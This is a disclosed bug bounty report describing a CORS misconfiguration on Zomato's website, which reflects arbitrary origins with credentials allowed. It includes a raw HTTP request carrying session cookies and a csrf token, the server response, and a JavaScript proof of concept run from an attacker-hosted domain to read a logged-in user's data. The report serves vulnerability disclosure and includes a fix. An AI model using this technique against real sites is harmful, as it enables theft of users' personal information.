# [www.zomato.com] CORS Misconfiguration, could lead to disclosure of sensitive information

## Report Details
- **Report ID**: 426165
- **URL**: https://hackerone.com/reports/426165
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-10-20T13:03:09.307Z
- **Disclosed**: 2018-11-28T03:56:25.552Z

## Reporter
- **Username**: ahd911
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: zomato

## Vulnerability Information
## Summary:
Cross Origin Resource Sharing Misconfiguration | Lead to sensitive information.

## Description:
An HTML5 cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request.
Trusting arbitrary origins effectively disables the same-origin policy, allowing two-way interaction by third-party web sites. Unless the response consists only of unprotected public content, this policy is likely to present a security risk.
If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. Even if it does not, attackers may be able to bypass any IP-based access controls by proxying through users' browsers.

Platform(s) Affected: [website]

*.zomato.com

## Steps To Reproduce:

## Proof Of Concept 1:

## Request:

GET /abudhabi HTTP/1.1
Host: www.zomato.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:62.0) Gecko/20100101 Firefox/62.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.zomato.com/
Cookie: zl=en; fbtrack=0c8f198276217196ed64230da7ec8506; _ga=GA1.2.1887254439.1538912146; _gcl_au=1.1.2098169460.1538912146; dpr=1; __utmx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:NaN; __utmxx=141625785.FQnzc5UZQdSMS6ggKyLrqQ$0:1540032478:8035200; G_ENABLED_IDPS=google; cto_lwid=8a9f6540-307d-4333-bd04-96eebdec23b1; SL_C_23361dd035530_KEY=05a4e27ac591b9ca633a4fe9b5fdc3875e22560f; fbcity=57; zhli=1; al=0; _gid=GA1.2.1724569398.1539946684; ██████████; session_id=c541029346655-a68e-4a04-b2f8-ef1992b2e230; AMP_TOKEN=%24NOT_FOUND; csrf=a84df4c9f61aadf31a4f1dd4ca48be6e; ak_bmsc=2C67C71C92EB260D24B70A22BB690F2C4F8C5EB21A5B00008607CB5B69982B47~plvdYiMgFHceTWhzyAX5U631p9L1788qeXL/lAyNPHymsMAnv6mHZSJNA05zvLH2oIoYhZh2IVuMrSYmbcah8ADEJOyyFO27PZ5N/H1Cdvks7MZe3E9Y91EtRL8tbHwWka49I9RjDSrHVcgq5z4OIk8dfQd05szzsPKkleP3Jp9MJD1rVdLEcg2cCHoQYw5ciHDvhZtMWN6RD0DxZBoe3LPsfb37q5xqHTQ8h9XpyqUzc=; _gat_city=1; _gat_country=1; _gat_global=1; _gat_globalV3=1; bm_sv=EDBA03CA40AC8D77509922CAA98130B4~OXaAg7LsgySzeWnqd9TzoaW6pGtPv7Ut2dYfUp7otuPnD1uJi3BUwSCYQiDP4q92NaiK6GLXT8xxPmWSgspcRyYjatr3Zc5lDyt8+MMSsDmykSMruOC6+5BPCXCEX+HulBpygHFzTAQJSoPSYxgsSjsbymzdQq/Q90b/MvSGLbo=
Connection: close
Upgrade-Insecure-Requests: 1
Origin: developersxzomato.com

## Response

HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8
Content-Length: 127168
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block; report=https://www.zomato.com/cspreport.php
Content-Security-Policy: frame-ancestors https://*.nearbuystag.in https://*.nearbuy.com 'self'; default-src *; font-src * data:; img-src * data:; media-src * blob:; script-src 'self' 'unsafe-inline' 'unsafe-eval' *.jwpcdn.com *.cloudflare.com *.twitter.com *.recruiterbox.com *.zdev.net *.zdev.net:8080 *.zomato.com *.tinymce.com *.gstatic.com *.googleapis.com *.google.com *.facebook.com sdk.accountkit.com *.doubleclick.net *.googlesyndication.com *.nr-data.net *.newrelic.com *.google-analytics.com *.akamaihd.net *.zmtcdn.com *.googletagmanager.com *.facebook.net *.googleadservices.com *.cdninstagram.com *.googlesyndication.com *.inspectlet.com *.spreedly.com *.instagram.com *.twimg.com *.mouseflow.com *.usersnap.com d3mvnvhjmkxpjz.cloudfront.net *.serving-sys.com *.sushissl.com *.pubnub.com tsgw.tataelxsi.co.in *.branch.io app.link cdn.poll-maker.com *.ampproject.org *.smartlook.com *.hotjar.com dashboard.hypertrack.io zba.se *.googletagmanager.com *.eff.org cdn.plot.ly *.zedo.com *.bing.com *.criteo.net *.criteo.com mddigital.in; style-src * 'unsafe-inline';
Access-Control-Allow-Origin: developersxzomato.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Headers: Content-Type, X-ZOMATO-CSRFT, *
Server: Zomato
Strict-Transport-Security: max-age=31536000
Expires: Sat, 20 Oct 2018 12:29:00 GMT
Pragma: no-cache
Date: Sat, 20 Oct 2018 12:29:00 GMT
Connection: close
Set-Cookie: LEL_JS=true; expires=Sat, 20-Oct-2018 12:59:00 GMT; Max-Age=1800
Cache-Control: max-age=0, no-cache, no-store, no-transform
Vary: Accept-Encoding, User-Agent
Strict-Transport-Security: max-age=31536000
Set-Cookie: bm_sv=EDBA03CA40AC8D77509922CAA98130B4~OXaAg7LsgySzeWnqd9TzoaW6pGtPv7Ut2dYfUp7otuPnD1uJi3BUwSCYQiDP4q92NaiK6GLXT8xxPmWSgspcRyYjatr3Zc5lDyt8+MMSsDnq267a1bOhniBmABAbrga8gmdQdjDNE5GsLvrlCcm07Q3hffJKqLj7hIkMIJhtw4g=; Domain=.zomato.com; Path=/; Max-Age=1053; HttpOnly

##POC 2

Open http://developersxzomato.com/ in browser and click ## Exploit .

## or:

Open any browser and go to  http://developersxzomato.com/ then inspect the page and go to console.
run the following code in console and you would find it pops up user information var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://www.zomato.com/abudhabi',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };


## How to fix:
Rather than using a wildcard or programmatically verifying supplied origins, use a whitelist of trusted domains.

## Note: 
* Take note from request I inject a header Origin: developersxzomato.com then from response it returns Access-Control-Allow-Origin: developersxzomato.com Which mean there is CORS misconfig here.

* All testing was made by a test user ## ahd911 and only this user .

* I hosted a website which is ## developersxzomato.com to proof this vulnerability.

## Impact

## Impact:
Attacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server.

If the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. Even if it does not, attackers may be able to bypass any IP-based access controls by proxying through users' browsers.

## Attachments
- Zomato_CORS.png
